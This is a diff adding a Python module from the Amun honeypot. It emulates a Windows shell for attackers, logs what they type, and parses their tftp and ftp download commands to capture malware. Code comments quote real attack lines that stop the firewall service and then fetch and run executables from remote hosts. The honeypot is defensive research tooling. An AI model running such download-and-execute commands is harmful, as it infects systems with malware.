@@ -1,0 +1,409 @@
+"""
+[Amun - low interaction honeypot]
+Copyright (C) [2008]  [Jan Goebel]
+
+This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>
+"""
+
+import psyco ; psyco.full()
+from psyco.classes import *
+
+import asyncore
+import asynchat
+import StringIO
+import sys
+import traceback
+import socket
+import time
+import re
+import random
+
+import iprange
+import amun_logging
+import shellemulator
+
+class req_handler(asynchat.async_chat):
+	def __init__(self, divLogger):
+		self.shellcmds = []
+		self.divLogger = divLogger
+		self.log_obj = amun_logging.amun_logging("bindport", divLogger['download'])
+		self.shellemu = shellemulator.shellemulator(divLogger['shellemulator'])
+		#os_id = random.randint(0,1)
+		#if os_id==0:
+		#	self.shellInfo = "Microsoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINNT\\System32>"
+		#	self.prompt = "C:\\WINNT\\System32>"
+		#else:
+		#	self.shellInfo = "Microsoft Windows 2000 [Version 5.00.2195]\n(C) Copyright 1985-2000 Microsoft Corp.\n\nC:\\WINDOWS\\System32>"
+		#	self.prompt = "C:\\WINDOWS\\System32>"
+		self.shellInfo = self.shellemu.getShellInfoLine()
+
+	def handle_incoming_connection(self, socket_object, addr, currentDownloads, item, event_dict, replace_locals, attIP, attPort, ownIP, ownPort, bindports):
+		asynchat.async_chat.__init__(self, conn=socket_object)
+		self.socket_object = socket_object
+		self.socket_object.settimeout(60.0)
+		self.settimeout(60.0)
+		self.item = item
+		#self._address = addr
+		self.event_dict = event_dict
+		self.currentDownloads = currentDownloads
+		self.bindports = bindports
+		self.replace_locals = replace_locals
+		#self.log_obj.log("incoming data connection: %s to port: %s" % (attIP, ownPort), 9, "debug", False, True)
+		try:
+			sendBytes = self.socket_object.send(self.shellInfo)
+		except socket.error, e:
+			self.handle_close()
+			return
+		if sendBytes<=0:
+			self.handle_close()
+			return
+		self.attIP = attIP
+		self.attPort = attPort
+		self.ownIP = ownIP
+		self.ownPort = ownPort
+
+	def handle_read(self):
+		try:
+			bytes = self.recv(1024)
+		except socket.error, e:
+			self.log_obj.log("handler socket error: %s" % (e), 9, "crit", True, False)
+			bytes = ""
+		self.collect_incoming_data(bytes)
+
+	def collect_incoming_data(self, data):
+		if data!="" and data!='local quit':
+			self.log_obj.log("data received: %s (%s)" % (data.strip('\r\n'), self.attIP), 6, "warn", True, True)
+			self.shellcmds.append(data)
+			self.bindports[self.item['dlident']] = "%s,%s,%s" % (self.item['own_host'],self.item['port'],int(time.time()))
+			try:
+				closeShell = False
+				#(prompt,closeShell) = self.shellInterpreter(data)
+				(prompt,closeShell,reply) = self.shellemu.shellInterpreter(data)
+				if closeShell:
+					self.handle_close()
+				else:
+					if reply!="":
+						sendBytes = self.socket_object.send(reply)
+					sendBytes = self.socket_object.send(prompt)
+			except socket.error, e:
+				self.handle_close()
+				return
+		elif data=='local quit':
+			self.log_obj.log("received local quit", 12, "debug", True, True)
+			self.handle_close()
+		elif data=="":
+			self.log_obj.log("no more data received", 12, "debug", False, False)
+			self.handle_close()
+		else:
+			self.log_obj.log("wrong data received (%s)" % (data), 12, "debug", True, False)
+			self.handle_close()
+
+	def shellInterpreter(self, data):
+		""" Interpret Incoming Shellcommands """
+		data = data.strip()
+		closeShell = False
+		### change directory
+		if data=="cd.." and self.prompt!="C:\\>":
+			position = self.prompt.rfind('\\')
+			self.prompt = self.prompt[:position]
+			if self.prompt=="C:":
+				self.prompt = "C:\\"
+			self.prompt = "%s>" % (self.prompt)
+		elif data=="cd\\":
+			self.prompt = "C:\\>"
+		elif data.startswith('cd '):
+			position = data.find(' ')
+			newdir = data[position+1:]
+			self.prompt = self.prompt[:-1]
+			if self.prompt[-1] == '\\':
+				self.prompt = "%s%s>" % (self.prompt,newdir)
+			else:
+				self.prompt = "%s\\%s>" % (self.prompt,newdir)
+		elif data=="exit":
+			closeShell = True
+		### return modified prompt
+		return self.prompt,closeShell
+
+	def handle_expt(self):
+		pass
+
+	def handle_close(self):
+		data = "".join(self.shellcmds)
+		data_length = len(data)
+		if data_length>0:
+			### perform regex tests
+			identifier = "%s%s%s%s" % (self.attIP, self.attPort, self.ownIP, self.ownPort)
+			self.add_to_downloads(data, identifier)
+		self.log_obj.log("closing bindport (%s:%s)" % (self.item['own_host'],self.item['port']), 12, "debug", True, True)
+		try:
+			self.socket_object.send(self.shellInfo)
+		except socket.error, e:
+			pass
+		try:
+			self.shutdown(socket.SHUT_RDWR)
+		except socket.error, e:
+			pass
+		self.remove_download_entry()
+		self.close()
+
+	def add_to_downloads(self, output, identifier):
+		try:
+			stripped_data = output.strip()
+			if stripped_data.find("local quit")>-1:
+				return
+			elif stripped_data.startswith('tftp'):
+				self.check_tftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('cmd.exe /c tftp'):
+				self.check_tftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('echo'):
+				self.check_ftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('e cho'):
+				self.check_ftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('cmd /c echo'):
+				self.check_ftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('cmd /k echo'):
+				self.check_ftp_cmd(stripped_data, identifier)
+			elif stripped_data.startswith('cmd /c net'):
+				self.check_ftp_cmd(stripped_data, identifier)
+			else:
+				self.log_obj.log("unknown remote command: %s" % (stripped_data), 6, "crit", True, True)
+				return
+		except KeyboardInterrupt:
+			raise
+		except:
+			raise
+
+	def check_ftp_cmd(self, stripped_data, identifier):
+		try:
+			### echo off&echo open 192.168.254.1 1023>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 18063_upload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&18063_upload.exe&echo off&del cmd.ftp&echo on
+			### echo off&echo open 192.168.1.47 1023>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 8896_upload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&8896_upload.exe&echo off&del cmd.ftp&echo on
+			### echo open 137.189.208.130 5379 > i&echo user 1 1 >> i &echo get setup_73146.exe >> i &echo quit >> i &ftp -n -s:i &setup_73146.exe
+			### cmd /c net stop SharedAccess &echo open 192.168.1.3 60810 >> tj &echo user d3m0n3 d4rk3v1l >> tj &echo get sr.exe >> tj &echo bye >> tj &ftp -n -v -s:tj &del tj &sr.exe &net start SharedAccess
+			#ip_port_expr = re.compile('.*open ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) ([0-9]+).*', re.S|re.I)
+			ip_port_expr = re.compile('.*open ([@a-zA-Z0-9\-\/\\\.\+:]+) ([0-9]+).*', re.S|re.I)
+			#self.log_obj.log("command: %s" % (stripped_data), 6, "crit", True, False)
+			match = ip_port_expr.search(stripped_data)
+			if match:
+				dinfo = {}
+				dinfo['isLocalIP'] = False
+				dinfo['hostile_host'] = self.attIP
+				dinfo['own_host'] = self.item['own_host']
+				self.init_ipranges()
+				download_ip = match.groups()[0]
+				if self.check_local(download_ip, self.attIP):
+					if self.replace_locals:
+						download_ip = self.attIP
+					else:
+						dinfo['isLocalIP'] = True
+						self.log_obj.log("local IP found", 6, "crit", True, False)
+						return
+				dinfo['host'] = download_ip
+				dinfo['port'] = match.groups()[1]
+				if int(dinfo['port'])<1 or int(dinfo['port'])>65550:
+					self.log_obj.log("wrong port: %s" % (stripped_data), 6, "crit", True, False)
+					return
+				dinfo['found'] = "ftp"
+				user_pass_expr = re.compile('>.*?&echo user (.*?) (.*?)>>|>>.*?&echo (.*?)>>.*?&echo (.*?)&', re.S|re.I)
+				match2 = user_pass_expr.search(stripped_data)
+				if match2:
+					if match2.groups()[0] != None:
+						dinfo['username'] = match2.groups()[0].strip()
+						dinfo['passwort'] = match2.groups()[1].strip()
+					else:
+						dinfo['username'] = match2.groups()[2].strip()
+						dinfo['passwort'] = match2.groups()[3].strip()
+					binary_expr = re.compile('echo get (.*?)>>', re.S|re.I)
+					match3 = binary_expr.search(stripped_data)
+					if match3:
+						file = match3.groups()[0].strip()
+						dinfo['path'] = [file]
+						dlident = "%s%s%s" % ( dinfo['host'].replace('.',''), dinfo['port'], dinfo['own_host'].replace('.','') )
+						dinfo['dlident'] = dlident
+						dinfo['vulnname'] = self.item['vulnname']
+						dinfo['displayURL'] = "ftp://%s:%s@%s:%s/%s" % (dinfo['username'],dinfo['passwort'],dinfo['host'],dinfo['port'],dinfo['path'])
+						if not self.event_dict['download'].has_key(dlident):
+							self.event_dict['download'][identifier] = dinfo
+						self.log_obj.log("ftp download: %s:%s User: %s Pass: %s File(s): %s" % (dinfo['host'],dinfo['port'],dinfo['username'],dinfo['passwort'],dinfo['path']), 6, "debug", True, False)
+						return
+					else:
+						self.log_obj.log("no file found: %s" % (stripped_data), 6, "crit", True, False)
+						return
+				else:
+					self.log_obj.log("no username/password found: %s" % (stripped_data), 6, "crit", True, False)
+					return
+			else:
+				self.log_obj.log("no remote host found: %s" % (stripped_data), 6, "crit", True, True)
+				return
+		except KeyboardInterrupt:
+			raise
+		except:
+			raise
+
+	def check_tftp_cmd(self, stripped_data, identifier):
+		try:
+			### cmd.exe /c tftp.exe -i 78.106.168.5 GET C:\WINDOWS\system32\nethost.exe && nethost.exe
+			### tftp -i 124.144.196.108 GET h3110.411 package.exe & package.exe & exit
+			### tftp -i 204.94.57.74 GET b7768.exe&b7768.exe
+			### tftp -i 192.168.0.4 GET enbiei.exe
+			ip_expr = re.compile("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", re.S|re.I)
+			match = ip_expr.search(stripped_data)
+			if match:
+				dinfo = {}
+				dinfo['isLocalIP'] = False
+				dinfo['hostile_host'] = self.attIP
+				dinfo['own_host'] = self.item['own_host']
+				self.init_ipranges()
+				download_ip = match.groups()[0]
+				if self.check_local(download_ip, self.attIP):
+					if self.replace_locals:
+						download_ip = self.attIP
+					else:
+						dinfo['isLocalIP'] = True
+						self.log_obj.log("local IP found", 6, "crit", True, False)
+				dinfo['host'] = download_ip
+				dinfo['port'] = 69
+				dinfo['found'] = "tftp"
+				file_expr = re.compile("get.*& (.+) &|get(.+)&|get(.+)", re.I)
+				m = file_expr.search(stripped_data)
+				if m:
+					if m.groups()[0]:
+						file = m.groups()[0].strip()
+					elif m.groups()[1]:
+						file = m.groups()[1].strip()
+					else:
+						file = m.groups()[2].strip()
+					dinfo['path'] = file
+					dlident = "%s%s" % (dinfo['host'].replace('.',''),dinfo['path'])
+					dinfo['dlident'] = dlident
+					dinfo['vulnname'] = self.item['vulnname']
+					dinfo['displayURL'] = "tftp://%s:69/%s" % (download_ip, file)
+					if not self.event_dict['download'].has_key(dlident):
+						self.event_dict['download'][identifier] = dinfo
+					self.log_obj.log("tftp download: %s file: %s" % (dinfo['host'], dinfo['path']), 6, "debug", True, False)
+					return
+				else:
+					self.log_obj.log("no file found: %s" % (stripped_data), 6, "crit", True, True)
+					return
+			else:
+				self.log_obj.log("no remote host found: %s" % (stripped_data), 6, "crit", True, True)
+				return
+		except KeyboardInterrupt:
+			raise
+		except:
+			raise
+
+	def remove_download_entry(self):
+		try:
+			if self.currentDownloads.has_key(self.item['dlident']):
+				del self.currentDownloads[self.item['dlident']]
+			if self.bindports.has_key(self.item['dlident']):
+				del self.bindports[self.item['dlident']]
+		except KeyboardInterrupt:
+			raise
+		except:
+			raise
+
+	def check_local(self, host, attIP):
+		try:
+			for localAddress in self.localIPliste:
+				if localAddress.contains(str(host)):
+					self.log_obj.log("local ip address found %s (attacker ip: %s)" % (host, attIP), 9, "div", False, False)
+					return True
+			return False
+		except KeyboardInterrupt:
+			raise
+		except:
+			return False
+
+	def init_ipranges(self):
+		### create local network ranges
+		self.localIPliste = []
+		self.localIPliste.append( iprange.IPRange("0.0.0.0/8") )
+		self.localIPliste.append( iprange.IPRange("10.0.0.0/8") )
+		self.localIPliste.append( iprange.IPRange("127.0.0.0/8") )
+		self.localIPliste.append( iprange.IPRange("169.254.0.0/16") )
+		self.localIPliste.append( iprange.IPRange("172.16.0.0/12") )
+		self.localIPliste.append( iprange.IPRange("192.168.0.0/16") )
+
+	def handle_error(self):
+		f = StringIO.StringIO()
+		traceback.print_exc(file=f)
+		self.log_obj.log( f.getvalue(), 9, "crit", True, True)
+		self.close()
+		sys.exit(1)
+
+
+class bindPort(asyncore.dispatcher):
+        def __init__(self, item, currentDownloads, bindports, event_dict, divLogger, config_dict, currentSockets):
+                asyncore.dispatcher.__init__(self)
+		self.divLogger = divLogger
+		self.log_obj = amun_logging.amun_logging("bindport", divLogger['download'])
+		#self.data = []
+		self.item = item
+		self.bindports = bindports
+		self.currentDownloads = currentDownloads
+		self.currentSockets = currentSockets
+		self.event_dict = event_dict
+		self.replace_locals = config_dict['replace_locals']
+                self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.set_reuse_addr()
+		self.identifier = "%s%s" % (item['own_host'],item['port'])
+                try:
+                        self.bind( (item['own_host'], int(item['port'])) )
+                except socket.error, e:
+                        self.log_obj.log("port already in use? (%s): %s" % (item['port'],e), 6, "crit", True, True)
+			self.remove_download_entry()
+                        return
+                self.listen(1)
+		if not self.currentSockets.has_key(self.identifier):
+			self.currentSockets[self.identifier] = (int(time.time()), self.socket)
+		bindports[item['dlident']] = "%s,%s,%s" % (item['own_host'],item['port'],int(time.time()))
+                self.log_obj.log("%s initialized on port %s" % (item['own_host'], item['port']), 6, "info", True, True)
+
+	def remove_download_entry(self):
+		if self.currentDownloads.has_key(self.item['dlident']):
+			del self.currentDownloads[self.item['dlident']]
+		if self.bindports.has_key(self.item['dlident']):
+			del self.bindports[self.item['dlident']]
+		if self.currentSockets.has_key(self.identifier):
+			del self.currentSockets[self.identifier]
+
+	def handle_close(self):
+		#self.remove_download_entry()
+		try:
+			self.shutdown(socket.SHUT_RDWR)
+		except:
+			pass
+		self.close()
+		self.log_obj.log("%s port closed %s" % (self.item['own_host'], self.item['port']), 6, "info", False, True)
+
+        def handle_accept(self):
+                try:
+			(conn, addr) = self.accept()
+			(attIP, attPort) = conn.getpeername()
+			(ownIP, ownPort) = conn.getsockname()
+			self.log_obj.log("incoming data connection: %s:%s to port: %s" % (attIP, attPort, ownPort), 9, "debug", True, True)
+			handler = req_handler(self.divLogger).handle_incoming_connection(conn, addr, self.currentDownloads, self.item, self.event_dict, self.replace_locals, attIP, attPort, ownIP, ownPort, self.bindports)
+                except socket.error, e:
+                        self.log_obj.log("error: %s" % (e), 6, "crit", True, True)
+		except KeyboardInterrupt:
+			raise
+                self.handle_close()
+		return
+
+	def handle_connect(self):
+		pass
+
+	def handle_expt(self):
+		self.close()
+
+	def handle_error(self):
+		f = StringIO.StringIO()
+		traceback.print_exc(file=f)
+		self.log_obj.log( f.getvalue(), 9, "crit", True, True)
+		self.close()
+		sys.exit(1)
